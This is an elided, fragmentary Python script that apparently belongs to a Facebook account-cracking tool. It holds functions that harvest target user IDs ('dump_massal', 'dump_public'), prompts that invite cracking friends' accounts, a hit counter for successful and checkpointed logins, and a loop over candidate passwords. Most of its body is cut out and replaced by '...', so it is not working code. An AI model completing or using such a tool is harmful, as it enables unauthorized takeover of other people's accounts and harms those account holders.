...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;32m[\033[1;32m☞\x1b[1;32m] PASTE ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def dump_public():
	try:
		...
		exit()
	print(f'{P} • If You Want to Crack Your Own Friendship')
	pil = input(f' •\033[1;91m Enter Target ID : ')
	try:
		...
		print('')
		print(f' • Total IDs : {asu}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
...
#	prog.update(des,description=f"[bold white][MR.KUBRA][bold white] [{loop}|{len(id)}]  [[bold green]{ok}[/]=[bold blue]{cp}[/]]")
	#prog.advance(des) 
	#prog.advance(des) 
	for pw in pwv:
		try:
